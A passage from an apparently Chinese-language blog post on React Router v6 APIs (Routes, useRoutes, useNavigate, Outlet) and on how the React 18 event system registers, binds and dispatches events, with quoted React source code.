&lt;Route path=&quot;/a/b/c&quot; component={Xxx}&gt;
const {id, name} = this.props.location.state || {}
</code></pre>
<ul>
<li><a href="https://react-router.docschina.org/web/api/withRouter">withRouter</a> &#x51FD;&#x6570; =&gt; &#x4F7F;&#x4E00;&#x822C;&#x7EC4;&#x4EF6;&#x83B7;&#x5F97;&#x8DEF;&#x7531;&#x7EC4;&#x4EF6;&#x7684;&#x76F8;&#x5173; API</li>
</ul>
<blockquote>
<p>&#x53EF;&#x901A;&#x8FC7; withRouter &#x9AD8;&#x9636;&#x7EC4;&#x4EF6;&#x8BBF;&#x95EE; history &#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x548C;&#x6700;&#x8FD1; &lt;Route&gt; &#x7684; match&#x3002;<br>
&#x5F53;&#x8DEF;&#x7531;&#x6E32;&#x67D3;&#x65F6;&#xFF0C;withRouter &#x4F1A;&#x5C06;&#x5DF2;&#x7ECF;&#x66F4;&#x65B0;&#x7684; match&#xFF0C;location &#x548C; history &#x5C5E;&#x6027;&#x4F20;&#x9012;&#x7ED9;&#x88AB;&#x5305;&#x88F9;&#x7684;&#x7EC4;&#x4EF6;&#x3002;</p>
</blockquote>
<pre><code class="language-jsx">// withRouter =&gt; &#x4F7F;&#x4E00;&#x822C;&#x7EC4;&#x4EF6;&#x5177;&#x6709;&#x8DEF;&#x7531;&#x7EC4;&#x4EF6; API 
import React, {Component} from &apos;react&apos;
import {withRouter} from &apos;react-router-dom&apos;
class Demo extends Component{...}
export default withRouter(Demo)
</code></pre>
<h3 id="react-router-v6">React Router v6</h3>
<ul>
<li>React Router &#x4EE5;&#x4E09;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x5305;&#x53D1;&#x5E03;&#x5230; npm</li>
</ul>
<p>react-router =&gt; &#x8DEF;&#x7531;&#x6838;&#x5FC3;&#x5E93;&#xFF0C;&#x63D0;&#x4F9B;&#x7EC4;&#x4EF6;&#x548C;&#x94A9;&#x5B50;&#xFF1B;react-router-dom =&gt; react-router &#x6240;&#x6709;&#x5185;&#x5BB9;&#x90FD;&#x88AB;&#x5305;&#x542B;&#xFF0C;&#x6DFB;&#x52A0;&#x4E13;&#x95E8;&#x7528;&#x4E8E; DOM &#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x5982; &lt;BrowserRouter&gt; &#x7B49;&#x3002;react-router-native =&gt; &#x542B; react-router &#x6240;&#x6709;&#x5185;&#x5BB9;&#xFF0C;&#x989D;&#x5916;&#x589E;&#x52A0;&#x7528;&#x4E8E; ReactNative &#x7684; API&#xFF0C;&#x5982; &lt;NativeRouter&gt; &#x7B49;&#x3002;</p>
<ul>
<li>&lt;Routes/&gt; &#x4E0E; &lt;Route/&gt;</li>
</ul>
<p>&#x901A;&#x8FC7;&#x5F15;&#x5165; <code>&lt;Routes&gt;</code> &#x66FF;&#x4EE3;&#x79FB;&#x9664;&#x7684; <code>&lt;Switch&gt;</code>&#x3002;<code>&lt;Routes&gt;</code>&#x3001;<code>&lt;Route&gt;</code> &#x5E94;&#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x524D;&#x8005;&#x5C06;&#x540E;&#x8005;&#x5305;&#x88F9;&#x3002;</p>
<p>path &#x5C5E;&#x6027;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x8DEF;&#x5F84;&#xFF0C;element &#x5C5E;&#x6027;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x5F53;&#x524D;&#x8DEF;&#x5F84;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x7EC4;&#x4EF6;&#x3002;</p>
<p><code>&lt;Route&gt;</code> &#x76F8;&#x5F53;&#x4E8E; if &#x8BED;&#x53E5;&#xFF0C;&#x82E5;&#x5176;&#x8DEF;&#x5F84;&#x4E0E;&#x5F53;&#x524D; URL &#x5339;&#x914D;&#xFF0C;&#x5219;&#x5448;&#x73B0;&#x5BF9;&#x5E94;&#x7684;&#x7EC4;&#x4EF6;&#x3002;</p>
<p><code>&lt;Route&gt;</code> &#x4E2D;&#x7684; caseSensitive &#x5C5E;&#x6027;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x5339;&#x914D;&#x65F6;&#x662F;&#x5426;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x9ED8;&#x8BA4; false&#x3002;</p>
<p>&#x5F53; URL &#x6539;&#x53D8;&#x65F6;&#xFF0C;<code>&lt;Routes&gt;</code> &#x4F1A;&#x67E5;&#x770B;&#x6240;&#x6709;&#x5B50; <code>&lt;Route&gt;</code> &#x4EE5;&#x5339;&#x914D;&#x5E76;&#x5448;&#x73B0;&#x7EC4;&#x4EF6;&#x3002;</p>
<p><code>&lt;Route&gt;</code> &#x53EF;&#x5D4C;&#x5957;&#x4F7F;&#x7528;&#xFF0C;&#x53EF;&#x914D;&#x5408; <code>useRoutes()</code> &#x914D;&#x7F6E;&#x8DEF;&#x7531;&#x8868;&#xFF0C;&#x4F46;&#x9700; <code>&lt;Outlet&gt;</code> &#x7EC4;&#x4EF6;&#x4EE5;&#x6E32;&#x67D3;&#x5176;&#x5B50;&#x8DEF;&#x7531;&#x3002;</p>
<pre><code class="language-jsx">&lt;Routes&gt;
  // &#x4E00;&#x7EA7;&#x8DEF;&#x7531; demo &#x6240;&#x5BF9;&#x5E94;&#x7684;&#x8DEF;&#x5F84;&#x4E3A; /demo*/
  &lt;Route path=&quot;demo&quot; element={&lt;Demo/&gt;}&gt;
    // inner01 &#x548C; inner02 &#x662F;&#x4E8C;&#x7EA7;&#x8DEF;&#x7531; =&gt; &#x5BF9;&#x5E94;&#x8DEF;&#x5F84;&#x4E3A; /demo/inner01 &#x548C; /demo/inner02
    &lt;Route path=&quot;inner01&quot; element={&lt;Inner01/&gt;}&gt;&lt;/Route&gt;
    &lt;Route path=&quot;inner02&quot; element={&lt;Inner02/&gt;}&gt;&lt;/Route&gt;
  &lt;/Route&gt;
&lt;/Routes&gt;
</code></pre>
<ul>
<li>React Router6 &#x5B9E;&#x73B0;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x7C7B;&#x540D;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x628A; className &#x7684;&#x503C;&#x5199;&#x6210;&#x51FD;&#x6570;</li>
</ul>
<pre><code class="language-jsx">// React Router5
&lt;NavLink className=&quot;default-style&quot; activeClassName=&quot;additional-style&quot; to=&quot;/demo&quot;&gt;Demo&lt;/NavLink&gt;
// React Router6
&lt;NavLink className={({isActive})=&gt;{return isActive ? &quot;default-style additional-style&quot; : &quot;default-style&quot;}} to=&quot;/demo&quot;&gt;Demo&lt;/NavLink&gt;
</code></pre>
<ul>
<li>useRoutes =&gt; &#x5C06;&#x5E94;&#x7528;&#x8DEF;&#x7531;&#x7684;&#x5C42;&#x7EA7;&#x8FDB;&#x884C;&#x7EDF;&#x4E00;&#x7BA1;&#x7406;</li>
</ul>
<pre><code class="language-jsx">import React from &apos;react&apos;
import {NavLink, useRoutes} from &apos;react-router-dom&apos;
import routes from &apos;./routes&apos;
export default function App(){
  const element = useRoutes(routes)
  return (
    ...
    {element}
  )
}
</code></pre>
<pre><code class="language-jsx">// routes/index.js
import Dashboard from &apos;../pages/Dashboard&apos;
import Info from &apos;..pages/Info&apos;
import {Navigate} from &apos;react-router-dom&apos;
export default [
  {path: &quot;/dashboard&quot;, element:&lt;Dashboard/&gt;},
  {path: &quot;/info&quot;, element:&lt;Info/&gt;},
  {path: &quot;/&quot;, element:&lt;Navigate to=&quot;/dashboard&quot;/&gt;}
]
</code></pre>
<p>NavLink</p>
<blockquote>
<p>If the <code>end</code> prop is used, it will ensure this component isn&apos;t matched as &quot;active&quot; when its descendant paths are matched. <a href="https://reactrouter.com/en/v6.3.0/api#navlink">v6.3</a></p>
</blockquote>
<ul>
<li>
<p>this.props.match.params &#x901A;&#x8FC7; useParams &#x6216; useMatch &#x66FF;&#x4EE3;</p>
</li>
<li>
<p>this.props.location &#x7684; search &#x53C2;&#x6570;&#x901A;&#x8FC7; useSearchParams &#x6216; useLocation &#x66FF;&#x4EE3;</p>
</li>
</ul>
<pre><code class="language-jsx">import {useSearchParams} from &apos;react-router-dom&apos;
export default function Xxx(){
  const [search, setSearch] = useSearchParams();
  const id = search.get(&quot;id&quot;);
  const msg = search.get(&quot;msg&quot;);
  ...
  return (&lt;&gt;...&lt;/&gt;)
}
</code></pre>
<ul>
<li>
<p>state &#x53C2;&#x6570;&#x4F7F;&#x7528; useLocation &#x66FF;&#x4EE3;</p>
</li>
<li>
<p>&#x7F16;&#x7A0B;&#x5F0F;&#x8DEF;&#x7531;&#x5BFC;&#x822A;</p>
</li>
<li>
<p>v6 &#x4E2D;&#x6CA1;&#x6709; this&#xFF0C;&#x53EF;&#x4F7F;&#x7528; useNavigate</p>
</li>
</ul>
<p>useNavigate hook &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x4EE5;&#x7F16;&#x7A0B;&#x65B9;&#x5F0F;&#x5BFC;&#x822A;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x4F8B;&#x5982;&#x5728;&#x63D0;&#x4EA4;&#x8868;&#x5355;&#x4E4B;&#x540E;&#x3002;</p>
<pre><code class="language-typescript">declare function useNavigate(): NavigateFunction;
interface NavigateFunction {
  (
    to: To,
    options?: { replace?: boolean; state?: any }
  ): void;
  (delta: number): void;
}
</code></pre>
<p><code>withRouter</code> &#x51FD;&#x6570;&#x5728; v6 &#x4E2D;&#x88AB; <code>useNavigate</code> &#x66FF;&#x4EE3;&#xFF0C;&#x4F20;&#x5165; <code>delta</code> &#x4EE5;&#x5BF9; history &#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;</p>
<pre><code class="language-jsx">import { useNavigate } from &quot;react-router-dom&quot;;
function eventHandle() {
  let navigate = useNavigate();
  async function handleSubmit(event) {
    event.preventDefault();
    await submitForm(event.target);
    navigate(&quot;../success&quot;, { replace: true });
  }
  return &lt;form onSubmit={handleSubmit}&gt;{/* ... */}&lt;/form&gt;;
}
</code></pre>
<ul>
<li>useInRouterContext =&gt; &#x5224;&#x65AD;&#x7EC4;&#x4EF6;&#x662F;&#x5426;&#x5728; <code>&lt;Router&gt;</code> &#x4E0A;&#x4E0B;&#x6587;&#x5448;&#x73B0;</li>
</ul>
<p>&#x901A;&#x8FC7;&#x8C03;&#x7528;&#x8BE5; hook &#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x5F53;&#x524D;&#x7EC4;&#x4EF6;&#x662F;&#x5426;&#x88AB; <code>&lt;XxxRouter&gt;</code> &#x4E4B;&#x6D41;&#x5305;&#x88F9;&#x3002;&#x5F00;&#x53D1;&#x4E2D;&#x82E5;&#x76F4;&#x63A5;&#x5C06; <code>&lt;App&gt;</code> &#x7EC4;&#x4EF6;&#x4EE5;&#x8DEF;&#x7531;&#x5305;&#x88F9;&#xFF0C;&#x5219;</p>
<p>&#x5C01;&#x88C5;&#x7EC4;&#x4EF6;&#x65F6;&#x5224;&#x65AD;&#x4F7F;&#x7528;&#x8005;&#x662F;&#x5426;&#x5728;&#x8DEF;&#x7531;&#x73AF;&#x5883;&#x4E0B;&#x4F7F;&#x7528;&#x3002;</p>
<ul>
<li>useNavigationType =&gt; &#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x7684;&#x5BFC;&#x822A;&#x7C7B;&#x578B; -&gt; POP|PUSH|REPLACE</li>
</ul>
<p>&#x6765;&#x5230;&#x5F53;&#x524D;&#x9875;&#x9762;&#x7684;&#x8DF3;&#x8F6C;&#x65B9;&#x5F0F;&#x3002;<code>POP</code> &#x4E3A;&#x76F4;&#x63A5;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x6253;&#x5F00;&#x8BE5;&#x8DEF;&#x7531;&#x7EC4;&#x4EF6;&#xFF08;&#x5237;&#x65B0;&#x9875;&#x9762;&#xFF09;&#x3002;</p>
<ul>
<li>useOutlet =&gt; &#x5448;&#x73B0;&#x5F53;&#x524D;&#x7EC4;&#x4EF6;&#x4E2D;&#x8981;&#x6E32;&#x67D3;&#x7684;&#x5D4C;&#x5957;&#x8DEF;&#x7531;</li>
</ul>
<p>&#x5D4C;&#x5957;&#x8DEF;&#x7531;&#x6302;&#x8F7D;&#x5219;&#x5C55;&#x793A;&#x5D4C;&#x5957;&#x7684;&#x8DEF;&#x7531;&#x5BF9;&#x8C61;&#xFF0C;&#x6CA1;&#x6709;&#x6302;&#x8F7D;&#x5219;&#x8FD4;&#x56DE; null&#x3002;</p>
<pre><code class="language-jsx">const result = useOutlet(); // &#x5D4C;&#x5957;&#x8DEF;&#x7531;&#x6CA1;&#x6709;&#x6302;&#x8F7D;&#x5219;&#x8FD4;&#x56DE; null
</code></pre>
<ul>
<li>
<p>useResolvedPath =&gt; &#x7ED9;&#x5B9A; URL &#x503C;&#xFF0C;&#x89E3;&#x6790;&#x5176;&#x4E2D;&#x7684; path|search|hash</p>
</li>
<li>
<p>&lt;Navigate&gt;</p>
</li>
</ul>
<p><code>&lt;Navigate&gt;</code> &#x7EC4;&#x4EF6;&#x5728;&#x6E32;&#x67D3;&#x65F6;&#x4F1A;&#x4FEE;&#x6539;&#x8DEF;&#x5F84;&#x5E76;&#x5207;&#x6362;&#x89C6;&#x56FE;&#x3002;replace &#x5C5E;&#x6027;&#x7528;&#x4E8E;&#x63A7;&#x5236;&#x8DF3;&#x8F6C;&#x6A21;&#x5F0F;&#xFF0C;&#x53EF;&#x9009; push &#x6216; replace&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A; push&#x3002;</p>
<pre><code class="language-jsx">import React, {useState} from &apos;react&apos;
import {Navigate} from &apos;react-router-dom&apos;
export default function Demo(){
  const [sum, setSum] = useState(1)
  return (
    &lt;&gt;
      {sum === 1 ? &lt;h4&gt;sum &#x7684;&#x503C;&#x4E3A; {sum}&lt;/h4&gt;:&lt;Navigate to=&quot;/about&quot; replace/&gt;}
      &lt;button onClick={() =&gt; setSum(2)}&gt;Click Change Sum to 2&lt;/button&gt;
    &lt;/&gt;
  )
}
</code></pre>
<ul>
<li>&lt;Outlet&gt; =&gt; &#x5F53; <code>&lt;Route&gt;</code> &#x4EA7;&#x751F;&#x5D4C;&#x5957;&#x65F6;&#xFF0C;&#x6E32;&#x67D3;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x540E;&#x7EED;&#x5B50;&#x8DEF;&#x7531;</li>
</ul>
<pre><code class="language-jsx">const element = useRoutes([
  {path:&apos;/about&apos;, element:&lt;About/&gt;},
  {
    path:&apos;/info&apos;,
    element:&lt;Info/&gt;,
    children:[
      {path:&apos;news&apos;, element:&lt;News/&gt;},
      {path:&apos;msg&apos;, element:&lt;Msg/&gt;}
    ]
  }
])
</code></pre>
<pre><code class="language-jsx">import React from &apos;react&apos;
import {NavLink, Outlet} from &apos;react-router-dom&apos;
export default function Home(){
  return (
    &lt;&gt;
      &lt;h2&gt;Home...&lt;/h2&gt;
      &lt;div&gt;
        &lt;ul className=&quot;nav nav-tabs&quot;&gt;
          &lt;li&gt;&lt;NavLink className=&quot;list-group-item&quot; to=&quot;news&quot;&gt;News&lt;/NavLink&gt;&lt;/li&gt;
          &lt;li&gt;&lt;NavLink className=&quot;list-group-item&quot; to=&quot;msg&quot;&gt;Msg&lt;/NavLink&gt;&lt;/li&gt;
        &lt;/ul&gt;
        &lt;Outlet/&gt;
      &lt;/div&gt;
    &lt;/&gt;
  )
}
</code></pre>
<ul>
<li>useRoutes =&gt; &#x6839;&#x636E;&#x8DEF;&#x7531;&#x8868;&#x52A8;&#x6001;&#x521B;&#x5EFA; &lt;Routes&gt; &#x548C; &lt;Route&gt;</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="parsing-the-source-code">Parsing The Source Code</h2>
<h3 id="v18-%E4%BA%8B%E4%BB%B6%E7%B3%BB%E7%BB%9F">v18 &#x4E8B;&#x4EF6;&#x7CFB;&#x7EDF;</h3>
<ul>
<li>&#x4E8B;&#x4EF6;&#x6CE8;&#x518C;</li>
</ul>
<p><a href="https://github.com/facebook/react/blob/44f99d75fa4528b82810edd03eccf82f7ea21ea0/packages/react-dom/src/events/DOMPluginEventSystem.js">DOMPluginEventSystem</a> &#x4E2D;&#x8C03;&#x7528;&#x5404;&#x7C7B; XxxEventPlugin &#x7684; <code>registerEvents()</code> &#x6CE8;&#x518C;&#x4E8B;&#x4EF6;&#x3002;registerEvents &#x5373;&#x4ECE; <a href="http://">DOMEventProperties</a> &#x5BFC;&#x5165;&#x7684; registerSimpleEvents &#x51FD;&#x6570;&#x3002;&#x5982; <a href="https://github.com/facebook/react/blob/44f99d75fa4528b82810edd03eccf82f7ea21ea0/packages/react-dom/src/events/plugins/SimpleEventPlugin.js">SimpleEventPlugin</a> &#x7684; <a href="https://github.com/facebook/react/blob/d4d1dc085d1332fdd5025c292adcb5b39811e5b5/packages/react-dom/src/events/DOMEventProperties.js">registerSimpleEvents</a>&#x3002;</p>
<pre><code class="language-javascript">// registerSimpleEvents &#x5373; registerEvents
export function registerSimpleEvents() {
  for (let i = 0; i &lt; simpleEventPluginEvents.length; i++) {
    const eventName = ((simpleEventPluginEvents[i]: any): string);
    const domEventName = ((eventName.toLowerCase(): any): DOMEventName);
    const capitalizedEvent = eventName[0].toUpperCase() + eventName.slice(1);
    registerSimpleEvent(domEventName, &apos;on&apos; + capitalizedEvent);
  }
  // Special cases where event names don&apos;t match.
  registerSimpleEvent(ANIMATION_END, &apos;onAnimationEnd&apos;);
  registerSimpleEvent(ANIMATION_ITERATION, &apos;onAnimationIteration&apos;);
  registerSimpleEvent(ANIMATION_START, &apos;onAnimationStart&apos;);
  registerSimpleEvent(&apos;dblclick&apos;, &apos;onDoubleClick&apos;);
  registerSimpleEvent(&apos;focusin&apos;, &apos;onFocus&apos;);
  registerSimpleEvent(&apos;focusout&apos;, &apos;onBlur&apos;);
  registerSimpleEvent(TRANSITION_END, &apos;onTransitionEnd&apos;);
}
</code></pre>
<p>&#x5728; <code>registerSimpleEvents()</code> &#x5185;&#x6709;&#x8C03;&#x7528; <code>registerSimpleEvent()</code> &#x51FD;&#x6570;&#xFF0C;&#x540E;&#x8005;&#x5185;&#x90E8;&#x53C8;&#x8C03;&#x7528; <a href="https://github.com/facebook/react/blob/44f99d75fa4528b82810edd03eccf82f7ea21ea0/packages/react-dom/src/events/EventRegistry.js"><code>registerTwoPhaseEvent()</code></a> &#x4EE5;&#x5206;&#x522B;&#x6CE8;&#x518C;&#x6355;&#x83B7;&#x548C;&#x5192;&#x6CE1;&#x9636;&#x6BB5;&#x7684;&#x4E8B;&#x4EF6;&#x3002;</p>
<pre><code class="language-javascript">function registerSimpleEvent(domEventName, reactName) {
  topLevelEventsToReactNames.set(domEventName, reactName);
  registerTwoPhaseEvent(reactName, [domEventName]);
}
</code></pre>
<pre><code class="language-javascript">export function registerTwoPhaseEvent(
  registrationName: string,
  dependencies: Array&lt;DOMEventName&gt;,
): void {
  registerDirectEvent(registrationName, dependencies);
  registerDirectEvent(registrationName + &apos;Capture&apos;, dependencies);
}
</code></pre>
<pre><code class="language-javascript">export function registerDirectEvent(
  registrationName: string,
  dependencies: Array&lt;DOMEventName&gt;,
) {
  ...
  registrationNameDependencies[registrationName] = dependencies;
}
</code></pre>
<ul>
<li>&#x4E8B;&#x4EF6;&#x7ED1;&#x5B9A;</li>
</ul>
<p><a href="https://github.com/facebook/react/blob/796d31809b3683083d3b62ccbab4f00dec8ffb1f/packages/react-dom/src/client/ReactDOMRoot.js">createRoot</a> &#x5728; <a href="ttps://github.com/facebook/react/blob/2c8a1452b82b9ec5ebfa3f370b31fda19610ae92/packages/react-dom/src/client/ReactDOM.js">ReactDOM.js</a> &#x4E0E; <a href="https://github.com/facebook/react/blob/2c8a1452b82b9ec5ebfa3f370b31fda19610ae92/packages/react-dom/client.js">client.js</a> &#x4E2D;&#x89C6;&#x4F5C; createRootImpl &#x8FDB;&#x884C;&#x8C03;&#x7528;&#xFF0C;&#x5373;&#x5728;&#x521B;&#x5EFA;&#x6839;&#x8282;&#x70B9;&#x4E4B;&#x540E;&#x4F1A;&#x6267;&#x884C; listenToAllSupportedEvents&#x3002;</p>
<pre><code class="language-javascript">export function createRoot(
  container: Element | Document | DocumentFragment,
  options?: CreateRootOptions,
): RootType {
  ...
  listenToAllSupportedEvents(rootContainerElement);
}
</code></pre>
<pre><code class="language-javascript">export function listenToAllSupportedEvents(rootContainerElement: EventTarget) {
  if (!(rootContainerElement: any)[listeningMarker]) {
    (rootContainerElement: any)[listeningMarker] = true;
    allNativeEvents.forEach(domEventName =&gt; {
      // We handle selectionchange separately because it
      // doesn&apos;t bubble and needs to be on the document.
      if (domEventName !== &apos;selectionchange&apos;) {
        if (!nonDelegatedEvents.has(domEventName)) {
          listenToNativeEvent(domEventName, false, rootContainerElement);
        }
        listenToNativeEvent(domEventName, true, rootContainerElement);
      }
    });
    const ownerDocument =
      (rootContainerElement: any).nodeType === DOCUMENT_NODE
        ? rootContainerElement
        : (rootContainerElement: any).ownerDocument;
    if (ownerDocument !== null) {
      // The selectionchange event also needs deduplication
      // but it is attached to the document.
      if (!(ownerDocument: any)[listeningMarker]) {
        (ownerDocument: any)[listeningMarker] = true;
        listenToNativeEvent(&apos;selectionchange&apos;, false, ownerDocument);
      }
    }
  }
}
</code></pre>
<p>&#x8C03;&#x7528; addTrappedEventListener &#x8FDB;&#x884C;&#x771F;&#x6B63;&#x7684;&#x4E8B;&#x4EF6;&#x7ED1;&#x5B9A;&#xFF0C;&#x7ED1;&#x5B9A;&#x5728;document&#x4E0A;&#xFF0C;dispatchEvent &#x4E3A;&#x7EDF;&#x4E00;&#x7684;&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#x3002;</p>
<pre><code class="language-javascript">export function listenToNativeEvent(
  domEventName: DOMEventName,
  isCapturePhaseListener: boolean,
  target: EventTarget,
): void {
  if (__DEV__) {
    if (nonDelegatedEvents.has(domEventName) &amp;&amp; !isCapturePhaseListener) {
      console.error(
        &apos;Did not expect a listenToNativeEvent() call for &quot;%s&quot; in the bubble phase. &apos; +
          &apos;This is a bug in React. Please file an issue.&apos;,
        domEventName,
      );
    }
  }

  let eventSystemFlags = 0;
  if (isCapturePhaseListener) {
    eventSystemFlags |= IS_CAPTURE_PHASE;
  }
  addTrappedEventListener(
    target,
    domEventName,
    eventSystemFlags,
    isCapturePhaseListener,
  );
}
</code></pre>
<pre><code class="language-javascript">function addTrappedEventListener(
  targetContainer: EventTarget,
  domEventName: DOMEventName,
  eventSystemFlags: EventSystemFlags,
  isCapturePhaseListener: boolean,
  isDeferredListenerForLegacyFBSupport?: boolean,
) {
  let listener = createEventListenerWrapperWithPriority( // &#x521B;&#x5EFA;&#x5177;&#x6709;&#x4F18;&#x5148;&#x7EA7;&#x7684;&#x76D1;&#x542C;&#x51FD;&#x6570;
    targetContainer,
    domEventName,
    eventSystemFlags,
  );
  ...
  targetContainer =
    enableLegacyFBSupport &amp;&amp; isDeferredListenerForLegacyFBSupport
      ? (targetContainer: any).ownerDocument
      : targetContainer;
  let unsubscribeListener;
  if (enableLegacyFBSupport &amp;&amp; isDeferredListenerForLegacyFBSupport) {
    const originalListener = listener;
    listener = function(...p) {
      removeEventListener(
        targetContainer,
        domEventName,
        unsubscribeListener,
        isCapturePhaseListener,
      );
      return originalListener.apply(this, p);
    };
  }
  // TODO: There are too many combinations here. Consolidate them.
  if (isCapturePhaseListener) { // &#x4E8B;&#x4EF6;&#x6355;&#x83B7;&#x9636;&#x6BB5;&#x5904;&#x7406;&#x51FD;&#x6570; =&gt; &#x8282;&#x70B9;&#x4E0A;&#x6DFB;&#x52A0;&#x4E8B;&#x4EF6;
    if (isPassiveListener !== undefined) {
      unsubscribeListener = addEventCaptureListenerWithPassiveFlag(
        targetContainer,
        domEventName,
        listener,
        isPassiveListener,
      );
    } else {
      unsubscribeListener = addEventCaptureListener(
        targetContainer,
        domEventName,
        listener,
      );
    }
  } else {
    if (isPassiveListener !== undefined) {
      unsubscribeListener = addEventBubbleListenerWithPassiveFlag(
        targetContainer,
        domEventName,
        listener,
        isPassiveListener,
      );
    } else {
      unsubscribeListener = addEventBubbleListener(
        targetContainer,
        domEventName,
        listener,
      );
    }
  }
}
</code></pre>
<pre><code class="language-javascript">export function createEventListenerWrapperWithPriority(
  targetContainer: EventTarget,
  domEventName: DOMEventName,
  eventSystemFlags: EventSystemFlags,
): Function {
  const eventPriority = getEventPriority(domEventName);
  let listenerWrapper;
  switch (eventPriority) {
    case DiscreteEventPriority:
      listenerWrapper = dispatchDiscreteEvent;
      break;
    case ContinuousEventPriority:
      listenerWrapper = dispatchContinuousEvent;
      break;
    case DefaultEventPriority:
    default:
      listenerWrapper = dispatchEvent;
      break;
  }
  return listenerWrapper.bind( // &#x7ED1;&#x5B9A; dispatchDiscreteEvent
    null,
    domEventName,
    eventSystemFlags,
    targetContainer,
  );
}
</code></pre>
<ul>
<li>&#x4E8B;&#x4EF6;&#x89E6;&#x53D1;</li>
</ul>
<p>React &#x4E8B;&#x4EF6;&#x6CE8;&#x518C;&#x65F6;&#xFF0C;<a href="https://github.com/facebook/react/blob/4175f05934d3954827c00b7633c1ce8e4e87d227/packages/react-dom/src/events/ReactDOMEventListener.js">dispatchDiscreteEvent</a> &#x4E3A;&#x7EDF;&#x4E00;&#x7684;&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#xFF0C;&#x5373;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#x9996;&#x5148;&#x6267;&#x884C; dispatchDiscreteEvent &#x51FD;&#x6570;&#xFF0C;&#x56E0; dispatchDiscreteEvent &#x524D;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x5DF2;&#x7ECF;&#x88AB; bind &#x7ED1;&#x5B9A;&#xFF0C;&#x6545;&#x4E8B;&#x4EF6;&#x6E90;&#x5BF9;&#x8C61; event.target &#x88AB;&#x9ED8;&#x8BA4;&#x7ED1;&#x5B9A;&#x6210;&#x6700;&#x540E;&#x53C2;&#x6570; nativeEvent&#x3002;</p>
<pre><code class="language-javascript">function dispatchDiscreteEvent(
  domEventName,
  eventSystemFlags,
  container,
  nativeEvent,
) {
  const previousPriority = getCurrentUpdatePriority();
  const prevTransition = ReactCurrentBatchConfig.transition;
  ReactCurrentBatchConfig.transition = null;
  try {
    setCurrentUpdatePriority(DiscreteEventPriority);
    dispatchEvent(domEventName, eventSystemFlags, container, nativeEvent);
  } finally {
    setCurrentUpdatePriority(previousPriority);
    ReactCurrentBatchConfig.transition = prevTransition;
  }
}
</code></pre>
<pre><code class="language-javascript">export function dispatchEvent(
  domEventName: DOMEventName,
  eventSystemFlags: EventSystemFlags,
  targetContainer: EventTarget,
  nativeEvent: AnyNativeEvent,
): void {
  if (!_enabled) {
    return;
  }
  if (enableCapturePhaseSelectiveHydrationWithoutDiscreteEventReplay) {
    dispatchEventWithEnableCapturePhaseSelectiveHydrationWithoutDiscreteEventReplay(
      domEventName,
      eventSystemFlags,
      targetContainer,
      nativeEvent,
    );
  } else {
    dispatchEventOriginal(
      domEventName,
      eventSystemFlags,
      targetContainer,
      nativeEvent,
    );
  }
}
</code></pre>
<pre><code class="language-javascript">import {dispatchEventForPluginEventSystem} from &apos;./DOMPluginEventSystem&apos;;
...
function dispatchEventOriginal(
  domEventName: DOMEventName,
  eventSystemFlags: EventSystemFlags,
  targetContainer: EventTarget,
  nativeEvent: AnyNativeEvent,
) {
  // TODO: replaying capture phase events is currently broken
  // because we used to do it during top-level native bubble handlers
  // but now we use different bubble and capture handlers.
  // In eager mode, we attach capture listeners early, so we need
  // to filter them out until we fix the logic to handle them correctly.
  const allowReplay = (eventSystemFlags &amp; IS_CAPTURE_PHASE) === 0;

  if (
    allowReplay &amp;&amp;
    hasQueuedDiscreteEvents() &amp;&amp;
    isDiscreteEventThatRequiresHydration(domEventName)
  ) {
    // If we already have a queue of discrete events, and this is another discrete
    // event, then we can&apos;t dispatch it regardless of its target, since they
    // need to dispatch in order.
    queueDiscreteEvent(
      null, // Flags that we&apos;re not actually blocked on anything as far as we know.
      domEventName,
      eventSystemFlags,
      targetContainer,
      nativeEvent,
    );
    return;
  }

  const blockedOn = findInstanceBlockingEvent(
    domEventName,
    eventSystemFlags,
    targetContainer,
    nativeEvent,
  );
  if (blockedOn === null) {
    dispatchEventForPluginEventSystem(
      domEventName,
      eventSystemFlags,
      nativeEvent,
      return_targetInst,
      targetContainer,
    );
    if (allowReplay) {
      clearIfContinuousEvent(domEventName, nativeEvent);
    }
    return;
  }

  if (allowReplay) {
    if (isDiscreteEventThatRequiresHydration(domEventName)) {
      // This this to be replayed later once the target is available.
      queueDiscreteEvent(
        blockedOn,
        domEventName,
        eventSystemFlags,
        targetContainer,
        nativeEvent,
      );
      return;
    }
    if (
      queueIfContinuousEvent(
        blockedOn,
        domEventName,
        eventSystemFlags,
        targetContainer,
        nativeEvent,
      )
    ) {
      return;
    }
    // We need to clear only if we didn&apos;t queue because
    // queueing is accumulative.
    clearIfContinuousEvent(domEventName, nativeEvent);
  }

  // This is not replayable so we&apos;ll invoke it but without a target,
  // in case the event system needs to trace it.
  dispatchEventForPluginEventSystem(
    domEventName,
    eventSystemFlags,
    nativeEvent,
    null,
    targetContainer,
  );
}
</code></pre>
<p><a href="https://github.com/facebook/react/blob/4175f05934d3954827c00b7633c1ce8e4e87d227/packages/react-dom/src/events/DOMPluginEventSystem.js">dispatchEventsForPlugins</a></p>
